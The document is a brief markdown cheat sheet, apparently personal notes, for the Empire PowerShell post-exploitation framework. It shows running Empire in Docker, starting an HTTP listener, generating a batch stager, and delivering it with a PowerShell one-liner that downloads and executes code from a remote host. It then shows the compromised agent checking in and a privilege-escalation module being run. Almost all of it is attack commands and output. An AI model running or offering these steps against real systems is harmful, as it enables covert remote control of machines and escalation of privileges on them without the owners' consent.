#### 1. About

- URL: `https://github.com/EmpireProject/Empire`
- Empire PwerShell agent


#### 2. Setup and run
```
# docker pull empireproject/empire
# docker run --name empire -v /tmp:/tmp -p 5000:5000 -d --rm -it empireproject/empire
# docker exec -it empire ./empire
```


#### 3. Example

1. Listener
```
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://192.168.9.11:5000
(Empire: listeners/http) > execute
(Empire: listeners/http) > back
```
Note: IP address of host interface where Docker container runs


2. Create payload
```
(Empire: listeners) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute
```


3. Prepare and deliver payload
```
# grep -oE 'powershell .*' /tmp/launcher.bat > data && python -m SimpleHTTPServer 8888
C:\> echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.9.11:8888/data') | powershell -noprofile -
```


4. Agent response
```
(Empire: stager/windows/launcher_bat) > [*] Sending POWERSHELL stager (stage 1) to ...
[*] New agent UPCLMZ1S checked in

(Empire: stager/windows/launcher_bat) > [+] Initial agent UPCLMZ1S from ... now active (Slack)
[*] Sending agent (stage 2) to UPCLMZ1S at ...

(Empire: stager/windows/launcher_bat) > agents
(Empire: stager/windows/launcher_bat) > interact UPCLMZ1S
(Empire: UPCLMZ1S) > usemodule privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) > run
```
